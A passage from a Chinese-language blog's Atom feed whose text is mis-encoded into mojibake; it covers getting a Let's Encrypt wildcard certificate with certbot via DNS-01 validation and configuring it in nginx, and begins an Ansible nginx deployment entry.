&lt;p&gt;æŒ‰ç…§ç®€ä¹¦ä¸Šçš„è¿™ä¸ªæµç¨‹: &lt;a href=&quot;https://www.jianshu.com/p/b1814f200fef&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;letsencryptè¯ä¹¦ä¸Šä¼ åˆ°é˜¿é‡Œäº‘SLB&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯å‡ºç°äº†ä¸€ä¸ªå¥‡æ€ªçš„ç°è±¡.æµè§ˆå™¨,PC,IOSç­‰è®¾å¤‡Httpsè®¿é—®å‡æ­£å¸¸,ä½†æ˜¯æ‰€æœ‰çš„å®‰å“è®¾å¤‡å¾®ä¿¡æ‰«ç å°ç¨‹åºç™»é™†å´æç¤ºè¯ä¹¦é”™è¯¯:&lt;strong&gt;err:request:fail ssl hand shake error&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Linux-Basic" scheme="https://jesse.top/categories/Linux-Basic/"/>
    
      <category term="SSL" scheme="https://jesse.top/categories/Linux-Basic/SSL/"/>
    
    
      <category term="SSL" scheme="https://jesse.top/tags/SSL/"/>
    
  </entry>
  
  <entry>
    <title>letsencrypté…ç½®é€šé…ç¬¦åŸŸåè¯ä¹¦</title>
    <link href="https://jesse.top/2018/10/15/Linux-Basic/SSL/letsencrypt%E9%85%8D%E7%BD%AE%E9%80%9A%E9%85%8D%E7%AC%A6%E5%9F%9F%E5%90%8D%E8%AF%81%E4%B9%A6/"/>
    <id>https://jesse.top/2018/10/15/Linux-Basic/SSL/letsencrypté…ç½®é€šé…ç¬¦åŸŸåè¯ä¹¦/</id>
    <published>2018-10-15T03:59:58.000Z</published>
    <updated>2019-02-17T09:31:38.012Z</updated>
    
    <content type="html"><![CDATA[<h2 id="letsencrypté…ç½®é€šé…ç¬¦åŸŸåè¯ä¹¦"><a href="#letsencrypté…ç½®é€šé…ç¬¦åŸŸåè¯ä¹¦" class="headerlink" title="letsencrypté…ç½®é€šé…ç¬¦åŸŸåè¯ä¹¦"></a>letsencrypté…ç½®é€šé…ç¬¦åŸŸåè¯ä¹¦</h2><h3 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>åœ¨ä»Šå¹´ç¨æ—©äº›çš„æ—¶å€™,letsencryptç»ˆäºå¼€å§‹å…è´¹æ”¯æŒé€šé…ç¬¦åŸŸåè¯ä¹¦äº†.ä½†æ˜¯åªæ”¯æŒä¸€ä¸ªå±‚çº§çš„é€šé…ä¸»æœºåŸŸå.</p><p>æ¯”å¦‚æˆ‘æ›¾ç»è¸©è¿‡çš„å‘:*.dev.xxx.comé€šé…ç¬¦åŸŸåè¯ä¹¦å¹¶ä¸èƒ½æ”¯æŒapi.v3.dev.xxx.comè¿™ç§ä¸‰å±‚å­åŸŸå.</p><p>å¦‚æœéœ€è¦ä¸ºapi.v3.dev.xxx.comç”³è¯·é€šé…ç¬¦è¯ä¹¦,åˆ™è¿˜éœ€è¦ç”³è¯·*.v3.dev.xxx.comé€šé…ç¬¦è¯ä¹¦</p><a id="more"></a><p>â€“</p><h3 id="letsencrypé€šé…ç¬¦è¯ä¹¦ç”³è¯·å‰æ"><a href="#letsencrypé€šé…ç¬¦è¯ä¹¦ç”³è¯·å‰æ" class="headerlink" title="letsencrypé€šé…ç¬¦è¯ä¹¦ç”³è¯·å‰æ"></a>letsencrypé€šé…ç¬¦è¯ä¹¦ç”³è¯·å‰æ</h3><h4 id="ACME-V2ç‰ˆæœ¬è¦æ±‚"><a href="#ACME-V2ç‰ˆæœ¬è¦æ±‚" class="headerlink" title="ACME V2ç‰ˆæœ¬è¦æ±‚"></a>ACME V2ç‰ˆæœ¬è¦æ±‚</h4><p>ä¸ºäº†å®ç°é€šé…ç¬¦è¯ä¹¦ï¼ŒLetâ€™s Encrypt å¯¹ ACME åè®®çš„å®ç°è¿›è¡Œäº†å‡çº§ï¼Œåªæœ‰ v2 åè®®æ‰èƒ½æ”¯æŒé€šé…ç¬¦è¯ä¹¦ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ä»»ä½•å®¢æˆ·ç«¯åªè¦æ”¯æŒ ACME v2 ç‰ˆæœ¬ï¼Œå°±å¯ä»¥ç”³è¯·é€šé…ç¬¦è¯ä¹¦äº†ï¼Œæ˜¯ä¸æ˜¯å¾ˆæ¿€åŠ¨ã€‚</p><p>å¯ä»¥æŸ¥çœ‹ä¸‹è‡ªå·±æƒ¯ç”¨çš„å®¢æˆ·ç«¯æ˜¯ä¸æ˜¯æ”¯æŒ ACME v2 ç‰ˆæœ¬ï¼Œå®˜æ–¹ä»‹ç» Certbot 0.22.0 ç‰ˆæœ¬æ”¯æŒæ–°çš„åè®®ç‰ˆæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@docker:~# ./certbot-auto --version</span><br><span class="line">certbot 0.27.1</span><br></pre></td></tr></table></figure><h4 id="éªŒè¯åŸŸåæ‰€æœ‰æƒçš„æ–¹å¼"><a href="#éªŒè¯åŸŸåæ‰€æœ‰æƒçš„æ–¹å¼" class="headerlink" title="éªŒè¯åŸŸåæ‰€æœ‰æƒçš„æ–¹å¼"></a>éªŒè¯åŸŸåæ‰€æœ‰æƒçš„æ–¹å¼</h4><p>Letâ€™s Encrypté¢å‘è¯ä¹¦çš„æ—¶å€™ï¼Œéœ€è¦æ ¡éªŒåŸŸåçš„æ‰€æœ‰æƒï¼Œè¯æ˜æ“ä½œè€…æœ‰æƒåˆ©ä¸ºè¯¥åŸŸåç”³è¯·è¯ä¹¦ï¼Œç›®å‰æ”¯æŒä¸‰ç§éªŒè¯æ–¹å¼ï¼š</p><p>dns-01ï¼šç»™åŸŸåæ·»åŠ ä¸€ä¸ª DNS TXT è®°å½•ã€‚<br>http-01ï¼šåœ¨åŸŸåå¯¹åº”çš„ Web æœåŠ¡å™¨ä¸‹æ”¾ç½®ä¸€ä¸ª HTTP well-known URL èµ„æºæ–‡ä»¶ã€‚<br>tls-sni-01ï¼šåœ¨åŸŸåå¯¹åº”çš„ Web æœåŠ¡å™¨ä¸‹æ”¾ç½®ä¸€ä¸ª HTTPS well-known URL èµ„æºæ–‡ä»¶ã€‚  </p><p><strong>è€Œç”³è¯·é€šé…ç¬¦è¯ä¹¦ï¼Œåªèƒ½ä½¿ç”¨ dns-01 çš„æ–¹å¼</strong></p><p>â€“</p><h3 id="ç”³è¯·é€šé…ç¬¦è¯ä¹¦æ–¹æ³•"><a href="#ç”³è¯·é€šé…ç¬¦è¯ä¹¦æ–¹æ³•" class="headerlink" title="ç”³è¯·é€šé…ç¬¦è¯ä¹¦æ–¹æ³•"></a>ç”³è¯·é€šé…ç¬¦è¯ä¹¦æ–¹æ³•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./certbot-auto certonly  -d *.devapi.haoshiqi.net --manual --preferred-challenges dns --server https://acme-v02.api.letsencrypt.org/directory</span><br></pre></td></tr></table></figure><p>ä»‹ç»ä¸‹ç›¸å…³å‚æ•°ï¼š</p><ul><li>certonlyï¼Œè¡¨ç¤ºå®‰è£…æ¨¡å¼ï¼ŒCertbot æœ‰å®‰è£…æ¨¡å¼å’ŒéªŒè¯æ¨¡å¼ä¸¤ç§ç±»å‹çš„æ’ä»¶ã€‚  </li><li>â€“manual è¡¨ç¤ºæ‰‹åŠ¨å®‰è£…æ’ä»¶ï¼ŒCertbot æœ‰å¾ˆå¤šæ’ä»¶ï¼Œä¸åŒçš„æ’ä»¶éƒ½å¯ä»¥ç”³è¯·è¯ä¹¦ï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®éœ€è¦è‡ªè¡Œé€‰æ‹©  </li><li>-d ä¸ºé‚£äº›ä¸»æœºç”³è¯·è¯ä¹¦ï¼Œå¦‚æœæ˜¯é€šé…ç¬¦ï¼Œè¾“å…¥ *.devapi.haoshiqi.netï¼ˆå¯ä»¥æ›¿æ¢ä¸ºä½ è‡ªå·±çš„åŸŸåï¼‰  </li><li>â€“preferred-challenges dnsï¼Œä½¿ç”¨ DNS æ–¹å¼æ ¡éªŒåŸŸåæ‰€æœ‰æƒ  </li><li>â€“serverï¼ŒLetâ€™s Encrypt ACME v2 ç‰ˆæœ¬ä½¿ç”¨çš„æœåŠ¡å™¨ä¸åŒäº v1 ç‰ˆæœ¬ï¼Œéœ€è¦æ˜¾ç¤ºæŒ‡å®šã€‚  </li></ul><p>ä¸‹é¢æ˜¯å‘½ä»¤è¾“å‡º:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@docker:~# ./certbot-auto certonly  -d *.devapi.haoshiqi.net --manual --preferred-challenges dns --server https://acme-v02.api.letsencrypt.org/directory</span><br><span class="line">Saving debug log to /var/log/letsencrypt/letsencrypt.log</span><br><span class="line">Plugins selected: Authenticator manual, Installer None</span><br><span class="line">Obtaining a new certificate</span><br><span class="line">Performing the following challenges:</span><br><span class="line">dns-01 challenge for devapi.haoshiqi.net</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">NOTE: The IP of this machine will be publicly logged as having requested this</span><br><span class="line">certificate. If you&apos;re running certbot in manual mode on a machine that is not</span><br><span class="line">your server, please ensure you&apos;re okay with that.</span><br><span class="line"></span><br><span class="line">Are you OK with your IP being logged?</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">(Y)es/(N)o: y</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Please deploy a DNS TXT record under the name</span><br><span class="line">_acme-challenge.devapi.haoshiqi.net with the following value:</span><br><span class="line"></span><br><span class="line">pjTQy43PDXAXBdP3roiftl1uzO-BBidaIG45703ReGs</span><br><span class="line"></span><br><span class="line">Before continuing, verify the record is deployed.</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Press Enter to Continue</span><br></pre></td></tr></table></figure><p>é¦–å…ˆ,ä¼šè¦æ±‚æ˜¯å¦åŒæ„IPå’Œè¯ä¹¦ç»‘å®š. è¾“å…¥yç»§ç»­ä¸‹ä¸€æ­¥</p><p>å…¶æ¬¡,ä¼šéªŒè¯DNSçš„TXTè®°å½•.è¿™é‡Œéå¸¸å…³é”®,å…ˆä¸è¦å›è½¦.Letsencryptè¦æ±‚é…ç½® DNS TXT è®°å½•ï¼Œä»è€Œæ ¡éªŒåŸŸåæ‰€æœ‰æƒï¼Œä¹Ÿå°±æ˜¯åˆ¤æ–­è¯ä¹¦ç”³è¯·è€…æ˜¯å¦æœ‰åŸŸåçš„æ‰€æœ‰æƒã€‚  </p><p>ä¸Šé¢è¦æ±‚ç»™_acme-challenge.devapi.haoshiqi.neté…ç½®ä¸€æ¡TXTè®°å½•.è®°å½•å€¼ä¸º:pjTQy43PDXAXBdP3roiftl1uzO-BBidaIG45703ReGs</p><p>æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯DnsPortåŸŸåè§£ææœåŠ¡ä¹Ÿå°±æ˜¯è…¾è®¯DNSè¿è¥å•†.åœ¨åŸŸåçš„DNSè§£æè®°å½•é‡Œæ·»åŠ ä¸€æ¡ä¸»æœºè®°å½•:_acme-challenge.devapi,å¯¹åº”ä¸Šé¢çš„txtå€¼å³å¯.å…·ä½“é…ç½®è¿‡ç¨‹å°±ä¸å†ä»‹ç»äº†</p><p>é…ç½®å®Œæˆå,å…ˆæ£€æŸ¥ä¸€ä¸‹é…ç½®æ˜¯å¦ç”Ÿæ•ˆ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> huangyong@huangyong-Macbook-Pro î‚° ~ î‚° dig -t txt _acme-challenge.devapi.haoshiqi.net @8.8.8.8</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; -t txt _acme-challenge.devapi.haoshiqi.net @8.8.8.8</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 3656</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 512</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;_acme-challenge.devapi.haoshiqi.net. INTXT</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">_acme-challenge.devapi.haoshiqi.net. 599 IN TXT&quot;pjTQy43PDXAXBdP3roiftl1uzO-BBidaIG45703ReGs&quot;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å·²ç»ç”Ÿæ•ˆäº†.æ­¤æ—¶å†å›åˆ°åˆšæ‰çš„ç•Œé¢,æŒ‰å›è½¦é”®..è¾“å‡ºå¦‚ä¸‹ä¿¡æ¯:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Please deploy a DNS TXT record under the name</span><br><span class="line">_acme-challenge.devapi.haoshiqi.net with the following value:</span><br><span class="line"></span><br><span class="line">pjTQy43PDXAXBdP3roiftl1uzO-BBidaIG45703ReGs</span><br><span class="line"></span><br><span class="line">Before continuing, verify the record is deployed.</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Press Enter to Continue</span><br><span class="line">Waiting for verification...</span><br><span class="line">Cleaning up challenges</span><br><span class="line"></span><br><span class="line">IMPORTANT NOTES:</span><br><span class="line"> - Congratulations! Your certificate and chain have been saved at:</span><br><span class="line">   /etc/letsencrypt/live/devapi.haoshiqi.net/fullchain.pem</span><br><span class="line">   Your key file has been saved at:</span><br><span class="line">   /etc/letsencrypt/live/devapi.haoshiqi.net/privkey.pem</span><br><span class="line">   Your cert will expire on 2019-01-13. To obtain a new or tweaked</span><br><span class="line">   version of this certificate in the future, simply run certbot-auto</span><br><span class="line">   again. To non-interactively renew *all* of your certificates, run</span><br><span class="line">   &quot;certbot-auto renew&quot;</span><br><span class="line"> - If you like Certbot, please consider supporting our work by:</span><br><span class="line"></span><br><span class="line">   Donating to ISRG / Let&apos;s Encrypt:   https://letsencrypt.org/donate</span><br><span class="line">   Donating to EFF:                    https://eff.org/donate-le</span><br><span class="line"></span><br><span class="line">root@docker:~#</span><br></pre></td></tr></table></figure><p>è¯ä¹¦ç”³è¯·æˆåŠŸ,è¯ä¹¦å’Œç§˜é’¥ä¿å­˜åœ¨ä¸‹é¢çš„ç›®å½•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@docker:~# ls -l /etc/letsencrypt/live/devapi.haoshiqi.net/</span><br><span class="line">total 4</span><br><span class="line">lrwxrwxrwx 1 root root  43 Oct 15 15:46 cert.pem -&gt; ../../archive/devapi.haoshiqi.net/cert1.pem</span><br><span class="line">lrwxrwxrwx 1 root root  44 Oct 15 15:46 chain.pem -&gt; ../../archive/devapi.haoshiqi.net/chain1.pem</span><br><span class="line">lrwxrwxrwx 1 root root  48 Oct 15 15:46 fullchain.pem -&gt; ../../archive/devapi.haoshiqi.net/fullchain1.pem</span><br><span class="line">lrwxrwxrwx 1 root root  46 Oct 15 15:46 privkey.pem -&gt; ../../archive/devapi.haoshiqi.net/privkey1.pem</span><br><span class="line">-rw-r--r-- 1 root root 682 Oct 15 15:46 README</span><br></pre></td></tr></table></figure><p>â€“</p><h3 id="Nginxé…ç½®è¯ä¹¦"><a href="#Nginxé…ç½®è¯ä¹¦" class="headerlink" title="Nginxé…ç½®è¯ä¹¦"></a>Nginxé…ç½®è¯ä¹¦</h3><p>è¯ä¹¦ç”³è¯·ä¸‹æ¥å,å°±å¯ä»¥åœ¨nginxé…ç½®è¯ä¹¦äº†.é…ç½®æ–¹æ³•æ¯”è¾ƒç®€å•.åªéœ€è¦åœ¨nginxé…ç½®æ–‡ä»¶ä¸­æ·»åŠ å‡ è¡Œå‘½ä»¤å³å¯.ä¾‹å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@docker:~# vim /data/conf/nginx/conf.d/hsq-openapi.conf</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">  listen 443 ssl http2;</span><br><span class="line"></span><br><span class="line">  server_name m.devapi.haoshiqi.net; # åŸŸå</span><br><span class="line"> </span><br><span class="line"> #æ·»åŠ æˆ–è€…ä¿®æ”¹ä»¥ä¸‹3è¡ŒSSLé…ç½®:</span><br><span class="line"> </span><br><span class="line">    ssl_certificate /etc/letsencrypt/live/devapi.haoshiqi.net/fullchain.pem;</span><br><span class="line">    ssl_certificate_key /etc/letsencrypt/live/devapi.haoshiqi.net/privkey.pem;</span><br><span class="line">    ssl_trusted_certificate  /etc/letsencrypt/live/devapi.haoshiqi.net/chain.pem;</span><br></pre></td></tr></table></figure><p>é‡å¯nginx,æµè§ˆå™¨è®¿é—®åŸŸå.é€šé…ç¬¦è¯ä¹¦å·²ç»ç”Ÿæ•ˆ.å¦‚ä¸‹å›¾æ‰€ç¤º:</p><p><img src="http://pabkmteb4.bkt.clouddn.com/letsencrypt.png" alt=""></p><p>â€“</p><h3 id="é€šé…ç¬¦è¯ä¹¦è‡ªåŠ¨ç»­æœŸ"><a href="#é€šé…ç¬¦è¯ä¹¦è‡ªåŠ¨ç»­æœŸ" class="headerlink" title="é€šé…ç¬¦è¯ä¹¦è‡ªåŠ¨ç»­æœŸ"></a>é€šé…ç¬¦è¯ä¹¦è‡ªåŠ¨ç»­æœŸ</h3><p>letsencryptçš„é€šé…ç¬¦è¯ä¹¦çš„æœ‰æ•ˆæœŸåŒæ ·ä¸º90å¤©.ä½†æ˜¯é€šé…ç¬¦çš„è‡ªåŠ¨ç»­çº¦æ¯”è¾ƒå¤æ‚.å› ä¸ºéœ€è¦äººå·¥é…ç½®DNSè®°å½•æ¥éªŒè¯åŸŸåæ§åˆ¶æƒ,æ‰€ä»¥ä¸èƒ½åƒå•åŸŸåè¯ä¹¦ä¸€æ ·ä½¿ç”¨certbotå·¥å…·æ¥è‡ªåŠ¨ç»­çº¦äº†.</p><p>ä¸è¿‡å¥½åœ¨ç½‘ç»œä¸Šæœ‰å¾ˆå¤šå¤§ç¥å†™äº†ä¸€äº›æ¯”è¾ƒä¼˜ç§€çš„è„šæœ¬å·¥å…·æ¥é€šè¿‡è°ƒç”¨DNSè§£æè¿è¥å•†çš„APIæ¥å£å®ç°è‡ªåŠ¨é…ç½®DNSè®°å½•.æ”¶é›†äº†2ä¸ªä½œè€…çš„è„šæœ¬æ¥å®ç°è‡ªåŠ¨ç»­æœŸ:</p><ul><li><a href="https://github.com/ywdblog/certbot-letencrypt-wildcardcertificates-alydns-au" target="_blank" rel="noopener">æœ¬æ–‡åŸä½œè€…ç¼–å†™çš„å·¥å…·</a></li><li><a href="https://github.com/Neilpang/acme.sh/tree/master/dnsapi" target="_blank" rel="noopener">acmeè„šæœ¬</a></li></ul><p>â€“</p><p>æœ¬æ–‡å¤§éƒ¨åˆ†çŸ¥è¯†ç‚¹æ¥è‡ªäº:<a href="https://www.jianshu.com/p/c5c9d071e395" target="_blank" rel="noopener">https://www.jianshu.com/p/c5c9d071e395</a></p><p>éå¸¸æ„Ÿè°¢åŸæ–‡ä½œè€…!</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;letsencrypté…ç½®é€šé…ç¬¦åŸŸåè¯ä¹¦&quot;&gt;&lt;a href=&quot;#letsencrypté…ç½®é€šé…ç¬¦åŸŸåè¯ä¹¦&quot; class=&quot;headerlink&quot; title=&quot;letsencrypté…ç½®é€šé…ç¬¦åŸŸåè¯ä¹¦&quot;&gt;&lt;/a&gt;letsencrypté…ç½®é€šé…ç¬¦åŸŸåè¯ä¹¦&lt;/h2&gt;&lt;h3 id=&quot;ä»‹ç»&quot;&gt;&lt;a href=&quot;#ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;ä»‹ç»&quot;&gt;&lt;/a&gt;ä»‹ç»&lt;/h3&gt;&lt;p&gt;åœ¨ä»Šå¹´ç¨æ—©äº›çš„æ—¶å€™,letsencryptç»ˆäºå¼€å§‹å…è´¹æ”¯æŒé€šé…ç¬¦åŸŸåè¯ä¹¦äº†.ä½†æ˜¯åªæ”¯æŒä¸€ä¸ªå±‚çº§çš„é€šé…ä¸»æœºåŸŸå.&lt;/p&gt;
&lt;p&gt;æ¯”å¦‚æˆ‘æ›¾ç»è¸©è¿‡çš„å‘:*.dev.xxx.comé€šé…ç¬¦åŸŸåè¯ä¹¦å¹¶ä¸èƒ½æ”¯æŒapi.v3.dev.xxx.comè¿™ç§ä¸‰å±‚å­åŸŸå.&lt;/p&gt;
&lt;p&gt;å¦‚æœéœ€è¦ä¸ºapi.v3.dev.xxx.comç”³è¯·é€šé…ç¬¦è¯ä¹¦,åˆ™è¿˜éœ€è¦ç”³è¯·*.v3.dev.xxx.comé€šé…ç¬¦è¯ä¹¦&lt;/p&gt;
    
    </summary>
    
      <category term="Linux-Basic" scheme="https://jesse.top/categories/Linux-Basic/"/>
    
      <category term="SSL" scheme="https://jesse.top/categories/Linux-Basic/SSL/"/>
    
    
      <category term="SSL" scheme="https://jesse.top/tags/SSL/"/>
    
  </entry>
  
  <entry>
    <title>Ansibleéƒ¨ç½²nginxå®æˆ˜</title>
    <link href="https://jesse.top/2018/08/30/Ansible/Ansible%20%E9%83%A8%E7%BD%B2Nginx%E9%A1%B9%E7%9B%AE%E7%9A%84playbook%E5%AE%9E%E8%B7%B5/"/>
    <id>https://jesse.top/2018/08/30/Ansible/Ansible éƒ¨ç½²Nginxé¡¹ç›®çš„playbookå®è·µ/</id>
    <published>2018-08-30T14:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.280Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Ansible-éƒ¨ç½²Nginxé¡¹ç›®çš„playbookå®è·µ"><a href="#Ansible-éƒ¨ç½²Nginxé¡¹ç›®çš„playbookå®è·µ" class="headerlink" title="Ansible éƒ¨ç½²Nginxé¡¹ç›®çš„playbookå®è·µ"></a>Ansible éƒ¨ç½²Nginxé¡¹ç›®çš„playbookå®è·µ</h2><p>å·¥ä½œä¸­ç»å¸¸éœ€è¦æ­å»ºé¡¹ç›®çš„ä¸šåŠ¡ç¯å¢ƒ.éœ€è¦éƒ¨ç½²åŒä¸€å¥—nginxç«™ç‚¹ä¸šåŠ¡åœ¨è”è°ƒ,æµ‹è¯•,é¢„å‘å¸ƒ,ç”Ÿäº§ç­‰å„ç§ä¸åŒç¯å¢ƒçš„æœåŠ¡å™¨ä¸Š.è¿™äº›å·¥ä½œä¸»è¦åŒ…æ‹¬ä¸¤ä¸ªéƒ¨åˆ†:åˆ›å»ºwebèµ„æºç›®å½•,nginxç«™ç‚¹é…ç½®.</p><p>ä¸‹é¢æ¥çœ‹çœ‹å¦‚ä½•ä½¿ç”¨playbookæ¥è‡ªåŠ¨åŒ–éƒ¨ç½²é¡¹ç›®åˆ°ä¸åŒç¯å¢ƒçš„å¤šå°æœåŠ¡å™¨ä¸Š:</p><a id="more"></a><hr><h3 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h3><h5 id="1-åˆ›å»ºä¸»æœºinventoryæ¸…å•"><a href="#1-åˆ›å»ºä¸»æœºinventoryæ¸…å•" class="headerlink" title="1.åˆ›å»ºä¸»æœºinventoryæ¸…å•"></a>1.åˆ›å»ºä¸»æœºinventoryæ¸…å•</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@ansible host_vars]$vim /etc/ansible/hosts</span><br><span class="line"></span><br><span class="line">[test]</span><br><span class="line">host100 ansible_host=172.16.1.100</span><br><span class="line">host120 ansible_host=172.16.1.120</span><br><span class="line">host102 ansible_host=172.16.1.102</span><br></pre></td></tr></table></figure><h5 id="1-å˜é‡æ–‡ä»¶"><a href="#1-å˜é‡æ–‡ä»¶" class="headerlink" title="1.å˜é‡æ–‡ä»¶"></a>1.å˜é‡æ–‡ä»¶</h5><p>ç”±äºä¸åŒçš„æœåŠ¡å™¨æ‰€å±ä¸åŒçš„ç¯å¢ƒ.æ‰€ä»¥éœ€è¦ä¸ºä¸åŒçš„ä¸»æœºå®šä¹‰æ‰€å±ç¯å¢ƒçš„å˜é‡.åˆ©ç”¨ansibleçš„host_varsä¸»æœºå˜é‡å¯ä»¥è½»æ¾å®ç°:</p><ul><li>åˆ›å»ºä¸»æœºå˜é‡ç›®å½•:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkidr /etc/ansible/host_vars</span><br></pre></td></tr></table></figure><ul><li>ä¸ºæ¯å°ä¸»æœºåˆ›å»ºå˜é‡æ–‡ä»¶,å®šä¹‰dwd_envå˜é‡.è¿™ä¸ªå˜é‡ä»£è¡¨äº†ä¸»æœºæ‰€åœ¨çš„ç¯å¢ƒ,</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@ansible host_vars]$vim host100</span><br><span class="line">---</span><br><span class="line">dwd_env: beta</span><br><span class="line"></span><br><span class="line">[root@ansible host_vars]$vim host102</span><br><span class="line">---</span><br><span class="line">dwd_env: dev</span><br></pre></td></tr></table></figure><blockquote><p>ä¸€å°è¿œç¨‹ä¸»æœºå±äºbetaç¯å¢ƒ,å¦å¤–ä¸€å°å±äºdevç¯å¢ƒ.</p><p>host_varsç›®å½•ä¸‹çš„æ–‡ä»¶åå’Œinventoryä¸»æœºæ¸…å•çš„ä¸»æœºåè¦ä¿æŒä¸€è‡´,åªè¦æ˜¯ä¸»æœºåæ–‡ä»¶å†…çš„å˜é‡éƒ½ä¼šè‡ªåŠ¨è¢«ansibleè°ƒç”¨åœ¨è¿™å°ä¸»æœºä¸‹</p></blockquote><h5 id="2-nginxçš„ç«™ç‚¹é…ç½®æ–‡ä»¶"><a href="#2-nginxçš„ç«™ç‚¹é…ç½®æ–‡ä»¶" class="headerlink" title="2.nginxçš„ç«™ç‚¹é…ç½®æ–‡ä»¶"></a>2.nginxçš„ç«™ç‚¹é…ç½®æ–‡ä»¶</h5><p>è¿™é‡Œå®šä¹‰ä¸¤ä¸ªç«™ç‚¹æ–‡ä»¶,åˆ†åˆ«æ˜¯openapiå’Œinternalapiçš„2å¥—é¡¹ç›®ç¯å¢ƒ.é…ç½®æ–‡ä»¶ç”±äºéœ€è¦è°ƒç”¨å˜é‡,æ‰€ä»¥ä½¿ç”¨templateæ¨¡æ¿åŠŸèƒ½å¯ä»¥å¾ˆå¥½çš„æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚.</p><ul><li>åœ¨playbookç›®å½•ä¸‹åˆ›å»ºtemplateç›®å½•</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 